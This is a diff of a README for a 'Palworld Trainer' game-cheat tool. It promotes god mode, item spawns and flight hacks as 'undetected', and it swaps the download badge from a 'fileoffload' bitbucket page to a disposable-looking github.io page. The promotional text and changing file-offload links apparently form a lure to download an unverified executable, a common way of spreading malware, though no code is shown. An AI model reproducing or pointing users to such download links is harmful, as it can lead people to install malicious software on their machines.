@@ -6,7 +6,7 @@
 
 Enter the **Palworld Trainer**. With one hotkey press, you unlock **god mode**, **infinite stamina**, **instant crafting**, **Pal buffs**, **item spawns**, and **flight hacks**. It's a clean, undetected, offline-ready cheat tool made for one thing—*breaking* the game (in a good way).
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Palworld-Trainer-xisas.github.io/.github)
 ---
 
 ## 🎮 Product Description
